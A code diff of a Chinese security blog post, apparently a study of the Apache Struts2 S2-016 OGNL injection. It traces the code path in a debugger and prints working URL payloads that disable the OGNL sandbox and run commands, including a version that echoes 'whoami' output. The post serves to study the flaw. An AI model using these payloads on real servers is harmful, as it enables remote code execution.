+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_3n63.png"></p>
 <p><code>struts.xml</code> 里写了 <code>extends=&quot;struts-default&quot;</code>，就把这些内置 result 类型全部继承过来了，所以 Struts2 解析到 <code>redirect:</code> 前缀的时候，直接查这个表找到对应的 <code>ServletRedirectResult</code> 类。</p>
 <p><code>redirect:</code> 只是其中一个注入点，Struts2 历史上被找到的注入点非常多：</p>
 <table>
@@ -435,31 +435,31 @@
 <p>从 URL 参数名、参数值前缀、请求头、请求体、文件名、命名空间，基本上能想到的地方都被找过一遍了，这也是为什么 Struts2 漏洞那么多，根本原因是框架过度依赖 OGNL，到处都在求值。</p>
 <hr>
 <h3 id="顺着调用链往下走"><a href="#顺着调用链往下走" class="headerlink" title="顺着调用链往下走"></a>顺着调用链往下走</h3><p>进入 <code>executeAction</code>：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260510_104822_n0ey.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_n0ey.png"></p>
 <p>可以看到 <code>dispatcher.serviceAction(request, response, servletContext, mapping)</code> 里多了个 <code>servletContext</code>，非常眼熟——内存马那里见过：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Listener 内存马里静态注册用到过</span></span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">context</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">context.addFilter(...)    ← 动态注册 Filter</span><br><span class="line">context.addServlet(...)   ← 动态注册 Servlet</span><br></pre></td></tr></table></figure>
 
 <p>进入 <code>createContextMap</code>，可以看到 URL 里面的 <code>redirect:$&#123;1+1&#125;</code> 被传入了参数 <code>params</code>，其他变量都是空的：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260510_104822_bluy.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_bluy.png"></p>
 <p>这也意味着请求的数据里有很多都会经过这个处理，都有可能成为注入点。</p>
 <p>接着进入 <code>createContextMap</code> 构造 <code>extraContext</code>：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260510_104822_rasc.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_rasc.png"></p>
 <p>在这个构造参数里，可以看到非常多的 <code>put</code> 方法，把各种对象塞进 Map，也就是把 <code>request/response/session</code> 塞进 OGNL context 的地方。这个 Map <code>extraContext</code> 最终就是 OGNL 的 context，所以 Payload 里才能用 <code>#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;)</code> 取出 response 对象。</p>
 <p>进一步跟进，发现 map 里面的参数被取出，加上有表达式的 OGNL context <code>extraContext</code> 一起被封装到了一个代理里面：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260510_104822_bgia.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_bgia.png"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">createActionProxy(</span><br><span class="line">    namespace,    // 命名空间 &quot;/&quot;</span><br><span class="line">    name,         // action 名字 &quot;index&quot;</span><br><span class="line">    method,       // 方法名 null（默认 execute）</span><br><span class="line">    extraContext, // OGNL context，塞了 request/response 等</span><br><span class="line">    true,         // executeResult，是否执行 result</span><br><span class="line">    false         // cleanupContext，是否清理 context</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
 
 <p>接下来在这里检测 <code>redirect</code>：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mapping.getResult() 拿到的就是之前在 ActionMapping 里看到的：</span><br><span class="line">result = org.apache.struts2.dispatcher.ServletRedirectResult</span><br></pre></td></tr></table></figure>
 
 <p>Struts2 在解析 URL 的时候就已经识别了 <code>redirect:</code> 前缀，把 <code>ServletRedirectResult</code> 存进了 <code>mapping</code>，现在这里把它取出来直接执行：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260510_104822_r90j.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_r90j.png"></p>
 <p><code>result.execute()</code> → <code>super.execute()</code>，这里调用父类的 <code>execute</code>，可以看到继承的是 <code>StrutsResultSupport</code>：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260510_104822_ohey.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_ohey.png"></p>
 <p>在 <code>StrutsResultSupport.execute()</code> 里看到一个 <code>location</code> 变量，值是 <code>$&#123;1+1&#125;</code>，这个时候表达式已经被提取出来了：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260510_104822_wzt1.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_wzt1.png"></p>
 <p>具体的截取逻辑在 <code>DefaultActionMapper</code> 里面：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260510_104822_0vgq.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_0vgq.png"></p>
 <p>常量 <code>REDIRECT_PREFIX</code>，值是 <code>&quot;redirect:&quot;</code>，就是处理 <code>redirect:</code> 前缀的：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">put(REDIRECT_PREFIX, <span class="keyword">new</span> <span class="title class_">ParameterAction</span>() &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(String key, ActionMapping mapping)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ServletRedirectResult</span> <span class="variable">redirect</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletRedirectResult</span>();</span><br><span class="line">        container.inject(redirect);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 直接截取 redirect: 后面的内容</span></span><br><span class="line">        <span class="comment">// key = &quot;redirect:$&#123;1+1&#125;&quot;</span></span><br><span class="line">        <span class="comment">// substring 之后 location = &quot;$&#123;1+1&#125;&quot;</span></span><br><span class="line">        <span class="comment">// 没有任何过滤，原封不动</span></span><br><span class="line">        redirect.setLocation(key.substring(REDIRECT_PREFIX.length()));</span><br><span class="line"></span><br><span class="line">        mapping.setResult(redirect);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
 
@@ -469,15 +469,15 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lastFinalLocation = conditionalParse(location, invocation);</span><br></pre></td></tr></table></figure>
 
 <p>这行是重点：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260510_104822_5nm9.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_5nm9.png"></p>
 <p><code>invocation</code> 是 <code>ActionInvocation</code> 对象，和之前的 <code>ActionProxy</code> 有关，里面有各种参数和环境。</p>
 <p><code>conditionalParse</code> 方法就在下面：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260510_104822_stri.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_stri.png"></p>
 <p><code>parse</code> 是 <code>StrutsResultSupport</code> 的一个成员变量，默认值是 <code>true</code>，这个条件默认就满足。<code>parse</code> 这个开关本来是给开发者用的，表示”是否解析表达式”，但默认是 <code>true</code>，而且用户输入没有经过任何过滤就到了这里，所以等于把 RCE 的大门直接敞开了。</p>
 <p>进入 <code>TextParseUtil.translateVariables</code>（源码在 xwork-core 里）：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://repo1.maven.org/maven2/org/apache/struts/xwork/xwork-core/2.3.15.1/xwork-core-2.3.15.1-sources.jar</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260510_104822_gtal.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_gtal.png"></p>
 <p><code>expression</code> 就是表达式 <code>$&#123;1+1&#125;</code>。<code>translateVariables</code> 方法里的第一个参数是一个数组，包含 <code>%</code> 和 <code>$</code>：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">char</span>[]&#123;<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;%&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>
 
@@ -488,9 +488,9 @@
 </ul>
 <p>两个符号都会被识别然后丢给 OGNL 执行，所以 S2-045 的 Payload 里用 <code>%&#123;...&#125;</code> 也能触发，根本原因就在这里。</p>
 <p>然后经过几个构造方法来到最后一个：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260510_104822_kp23.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_kp23.png"></p>
 <p>这个就是核心的漏洞触发代码：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260510_104822_y8yt.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_y8yt.png"></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> parser.evaluate(openChars, expression, ognlEval, maxLoopCount);</span><br></pre></td></tr></table></figure>
 
 <ul>
@@ -500,15 +500,15 @@
 <li><code>maxLoopCount</code> → 最大循环次数，防止死循环，比如 <code>$&#123;$&#123;1+1&#125;&#125;</code> 这种嵌套表达式</li>
 </ul>
 <p><code>evaluate</code> 方法就是匹配字符的逻辑：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260510_104822_a6x4.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_a6x4.png"></p>
 <p>这个机制让我想到了之前看过的 Log4j 的代码——类似 <code>%&#123;&quot;$&quot;&#125;&#123;1+1&#125;</code> 这种，第一次解析变成 <code>$&#123;1+1&#125;</code> 然后再次解析，两者思路是一样的。</p>
 <p>第三个参数 <code>ognlEval</code> 是 <code>ParsedValueEvaluator</code> 对象，里面的 <code>Object o = stack.findValue(parsedValue, asType)</code> 是执行表达式的最终地方。</p>
 <p>在 <code>evaluate</code> 里：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260510_104822_uezw.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_uezw.png"></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">var</span> <span class="operator">=</span> expression.substring(start + <span class="number">2</span>, end);  <span class="comment">// 提取表达式，跳过前面的 $&#123;</span></span><br><span class="line"><span class="comment">// 所以 var = &quot;1+1&quot;</span></span><br><span class="line"><span class="comment">// 然后丢给 evaluator.evaluate(&quot;1+1&quot;) 执行</span></span><br></pre></td></tr></table></figure>
 
 <p>调用了 <code>ognlEval</code> 这个回调，最后来到：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260510_104822_2yd5.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_2yd5.png"></p>
 <p>这里的代码就和前面的示例代码类似了：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">参数：</span><br><span class="line">expr    = &quot;1+1&quot;        ← 用户输入的表达式</span><br><span class="line">context = OGNL context ← 里面有 request/response/session</span><br><span class="line">root    = Action 对象  ← HelloAction 实例</span><br><span class="line">asType  = String.class ← 期望返回类型</span><br></pre></td></tr></table></figure>
 
@@ -516,11 +516,11 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ognl.getValue(expr, context, root)</span><br></pre></td></tr></table></figure>
 
 <p>处理完后把结果处理成字符串返回：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260510110717618.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510110717618.png"></p>
 <p>然后经过一系列返回，回到父类的 <code>execute</code> 方法：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260510_104822_90gz.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_90gz.png"></p>
 <p>接下来是 <code>doExecute</code> 的方法，其中第一个参数 <code>lastFinalLocation</code> 就是表达式的返回值 <code>2</code>：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260510_104822_py44.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_py44.png"></p>
 <p>方法的最后面就是：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sendRedirect(response, finalLocation);</span><br></pre></td></tr></table></figure>
 
@@ -545,16 +545,16 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redirect:$&#123;@java.lang.Runtime@getRuntime().exec(&quot;calc&quot;)&#125;</span><br></pre></td></tr></table></figure>
 
 <h3 id="问题：静态方法被拦截"><a href="#问题：静态方法被拦截" class="headerlink" title="问题：静态方法被拦截"></a>问题：静态方法被拦截</h3><p>发包之后发现计算器没有正常弹出，而是重定向到了 <code>/</code>：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260510_104822_6b7k.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_6b7k.png"></p>
 <p>调试发现 <code>expr</code> 就是 <code>@java.lang.Runtime@getRuntime().exec(&quot;calc.exe&quot;)</code>，数据正常传入了：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260510_104822_rrb1.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_rrb1.png"></p>
 <p>但经过 OGNL 返回的 <code>o</code> 确实是 <code>null</code>：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260510_104822_gl75.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_gl75.png"></p>
 <p>这说明数据正常输入了，没有被过滤，但经过 OGNL 处理时却失败了。跟进 <code>ognlEval</code> 里看看怎么回事：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">findValue</span><br><span class="line">&gt;&gt; tryFindValueWhenExpressionIsNotNull</span><br><span class="line">&gt;&gt; tryFindValue</span><br><span class="line">&gt;&gt; getValue</span><br><span class="line">&gt;&gt; ...</span><br></pre></td></tr></table></figure>
 
 <p>最后到了 <code>SecurityMemberAccess.isAccessible()</code>：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260510_104822_qdoa.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_qdoa.png"></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (Modifier.isStatic(modifiers)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (member <span class="keyword">instanceof</span> Method &amp;&amp; !getAllowStaticMethodAccess()) &#123;</span><br><span class="line">        allow = <span class="literal">false</span>;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>这就是拦截静态方法的地方：</p>
@@ -572,7 +572,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.action?redirect:%24%7B%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%40java.lang.Runtime%40getRuntime().exec(%22calc.exe%22)%7D</span><br></pre></td></tr></table></figure>
 
 <p>发包之后成功弹出了计算器：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260510_104822_znm8.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_znm8.png"></p>
 <hr>
 <h3 id="Payload-3：命令回显版"><a href="#Payload-3：命令回显版" class="headerlink" title="Payload 3：命令回显版"></a>Payload 3：命令回显版</h3><p>弹计算器只是验证，实际利用需要命令回显，完整 Payload：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">redirect:$&#123;</span><br><span class="line">  // 用反射把沙箱的 allowStaticMethodAccess 改成 true，允许静态方法调用</span><br><span class="line">  #f=#_memberAccess.getClass().getDeclaredField(&quot;allowStaticMethodAccess&quot;),</span><br><span class="line">  #f.setAccessible(true),</span><br><span class="line">  #f.set(#_memberAccess,true),</span><br><span class="line"></span><br><span class="line">  // 调用 Runtime 静态方法拿到实例，执行 whoami 命令，返回 Process 对象存进 #a</span><br><span class="line">  #a=@java.lang.Runtime@getRuntime().exec(&quot;whoami&quot;),</span><br><span class="line"></span><br><span class="line">  // 读取命令执行结果：Java 里标准的读取进程输出写法</span><br><span class="line">  #b=new java.io.InputStreamReader(#a.getInputStream()),</span><br><span class="line">  #c=new java.io.BufferedReader(#b),</span><br><span class="line">  #d=#c.readLine(),</span><br><span class="line"></span><br><span class="line">  // 从 OGNL context 里取出 HttpServletResponse 对象存进 #matt</span><br><span class="line">  // 用全限定名取是因为 Struts2 就是用这个 key 存进去的</span><br><span class="line">  #matt=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),</span><br><span class="line"></span><br><span class="line">  // 把命令执行结果写进 HTTP Response，在 Burp 的 Response body 里就能看到结果</span><br><span class="line">  #matt.getWriter().println(#d),</span><br><span class="line">  #matt.getWriter().flush(),</span><br><span class="line">  #matt.getWriter().close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -581,7 +581,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.action?redirect:%24%7B%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22whoami%22)%2C%23b%3Dnew+java.io.InputStreamReader(%23a.getInputStream())%2C%23c%3Dnew+java.io.BufferedReader(%23b)%2C%23d%3D%23c.readLine()%2C%23matt%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2C%23matt.getWriter().println(%23d)%2C%23matt.getWriter().flush()%2C%23matt.getWriter().close()%7D</span><br></pre></td></tr></table></figure>
 
 <p>命令回显成功：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260510_104822_5ww2.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260510_104822_5ww2.png"></p>
 <hr>
 <h2 id="十、总结"><a href="#十、总结" class="headerlink" title="十、总结"></a>十、总结</h2><p>S2-016 本身不复杂，但背后的东西值得花时间搞清楚。</p>
 <p><strong>漏洞核心：</strong> 用户输入的 <code>redirect:</code> 后面的内容，在 <code>DefaultActionMapper</code> 里被 <code>substring</code> 截取后没有任何过滤，直接通过 <code>setLocation</code> 存入 <code>ServletRedirectResult</code>，最终在 <code>StrutsResultSupport.conditionalParse()</code> 里被丢给 OGNL 引擎执行，实现 RCE。</p>
@@ -1037,7 +1037,7 @@
 </script>
 
 <!-- required -->
-<script src="/js/main.js?v=mp5bt8it" defer></script>
+<script src="/js/main.js?v=mp5jbj58" defer></script>
 
 <script type="text/javascript">
   const applyTheme = (theme) => {
@@ -1301,7 +1301,7 @@
 <script src="/js/plugins/hotkeys.js"></script>
 
 <!-- Achievements / Card System -->
-<script src="/js/plugins/achievements.js?v=mp5bt8it"></script>
+<script src="/js/plugins/achievements.js?v=mp5jbj58"></script>
 
 <!-- Special Days - 节日彩蛋系统 -->
 <script src="/js/plugins/special-days.js"></script>
